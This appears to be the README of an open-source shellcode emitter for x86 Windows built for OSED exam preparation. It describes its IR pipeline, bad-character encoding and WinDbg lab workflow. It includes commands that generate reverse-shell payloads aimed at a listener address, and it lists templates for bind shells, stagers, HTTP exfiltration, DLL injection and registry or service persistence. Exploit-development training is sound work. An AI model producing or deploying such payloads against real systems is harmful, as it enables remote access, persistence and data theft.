# Emitera

Shellcode emitter with a typed intermediate representation, automatic
bad-character encoding, and debugger-ready harnesses. The x86 Windows backend
ships first; the IR is architecture-neutral by design.

Built for OSED certification prep: every generated payload avoids declared bad
characters (null, CR, LF by default), and the debug runner drops straight into
WinDbg for single-step validation.

## Features

- **YAML manifests** declare the payload: template, bad characters, Win32 APIs,
  stack strings, and variables. The emitter handles the rest.
- **Typed Workflow IR** models API call sequences as immutable, validated
  dataclasses with control-flow branching, struct initialization, and
  success predicates.
- **Bad-character avoidance** across immediates, memory operands, and string
  construction, using XOR-mask pairs or arithmetic sequences.
- **Verification lane** generates, assembles, scans for violations, and writes
  a JSON report, all in one command.
- **Debug runner** is a self-contained Python script with embedded assembly that
  assembles on the Windows VM, allocates RWX memory, prints a WinDbg
  breakpoint address, and waits for you to attach before executing.

## Quick start

Requires Python 3.13+ and [uv](https://docs.astral.sh/uv/).

```bash
# Install dependencies
uv sync

# Generate a reverse shell (assembly source, debug runner, contract docs)
uv run emitera emitera/manifests/revshell.yaml \
  --template ir_reverse_shell \
  --lhost 192.168.1.100 --lport 9001 \
  --out emitter_out/

# Generate without assembling (no assembler needed)
uv run emitera emitera/manifests/revshell.yaml \
  --template ir_reverse_shell \
  --no-assemble \
  --out emitter_out/

# Run a command (calc.exe by default)
uv run emitera emitera/manifests/calc.yaml \
  --template ir_run_command \
  --no-assemble \
  --out emitter_out/
```

Assembly (Keystone or NASM) is only available on the Windows lab VM. Use
`--no-assemble` on Mac to produce the `.asm` source and debug runner.

## Verification

```bash
# Full verification pipeline (assemble + bad-char scan + JSON report)
uv run python -m emitera.verify emitera/manifests/revshell.yaml \
  --template ir_reverse_shell \
  --lhost 10.0.0.1 --lport 9001

# JSON output for scripting
uv run python -m emitera.verify emitera/manifests/calc.yaml \
  --template ir_run_command --json
```

The verification lane has three tiers:

1. **Cross-platform** (runs anywhere): generate assembly, scan for bad characters
2. **Assembly + byte scan** (requires assembler): assemble, verify bytes, check determinism
3. **Manual lab** (Windows VM + WinDbg): execute debug_runner.py, step through each API call

## Windows lab workflow

1. Copy `emitter_out/asm/debug_runner.py` to the Windows VM
2. `pip install keystone-engine`
3. Run `python debug_runner.py`
4. Copy the printed shellcode address
5. In WinDbg: `bp <address>`, then press Enter in the script
6. Step through: PEB walk, hash resolution, API calls

## Payload templates

### IR workflows (typed, validated)

| Template | Description |
|---|---|
| `ir_run_command` | WinExec + ExitProcess with result branching |
| `ir_reverse_shell` | WSAStartup, WSASocketA, connect, CreateProcessA |

### Legacy templates

`reverse_shell`, `run_command`, `bind_shell`, `copy_file`, `copy_then_run`,
`move_then_run`, `tcp_download`, `tcp_stager`, `http_download`, `http_exfil`,
`process_replace`, `service_persist`, `dll_inject`, `registry_persist`,
`check_path`, `get_username`, `download_to_userpath`, `tcp_download_to_userpath`

## Pipeline

```
manifest.yaml
  -> schema.py         (load, validate)
  -> stack_alloc.py    (assign EBP-relative slot offsets)
  -> build.py          (orchestrate generation)
       1. Framework stubs (PEB walk, hash resolver)
       2. API resolution stubs per function
       3. Module loading (LoadLibraryA calls)
       4. String construction
       5. Structure initialization
       6. Payload assembly (template or IR workflow)
  -> assembler         (Keystone or NASM)
  -> doc_gen.py        (contract.md: stack map, API table, cheatsheet)
```

## Build outputs

The emitter writes to `emitter_out/` (or `--out`):

- `asm/generated.asm`: full assembly source
- `asm/debug_runner.py`: standalone script for Windows lab testing
- `bin/shellcode.bin`: raw bytes (when assembler is available)
- `Documentation/contract.md`: stack layout, API table, struct layouts, cheatsheet

## Tests

```bash
uv run pytest          # full suite (500+ tests)
uv run ruff check .    # linting
uv run mypy emitera/workflow/   # strict type checking on IR module
```

Tests that require an assembler (`test_full_build_assembles`) are expected
to skip on Mac.

## Project structure

```
emitera/
  api_database.py       # Win32 API records, struct definitions, module load order
  schema.py             # YAML manifest loader and validator
  stack_alloc.py        # EBP-relative stack slot allocator
  build.py              # Orchestrator, assembler backends, debug runner generation
  encode.py             # Bad-character-safe encoding (XOR, arithmetic)
  string_emitter.py     # Stack string construction (mov, push, shiftor, xor)
  structure_emitter.py  # Struct initialization assembly
  doc_gen.py            # Contract documentation generator
  verify.py             # Verification lane (build, assemble, scan, report)
  payload_templates/    # Legacy payload templates
  workflow/
    ir.py               # Typed IR: operations, blocks, workflows (frozen dataclasses)
    catalog.py          # ABI catalog with typed argument descriptors
    validator.py        # Control-flow-aware IR validation
    x86_backend.py      # x86 lowering: IR to assembly
    reference.py        # Reference workflows and WorkflowTemplate adapter
  manifests/            # YAML payload manifests
  tests/                # 500+ tests
```

## License

[MIT](LICENSE)
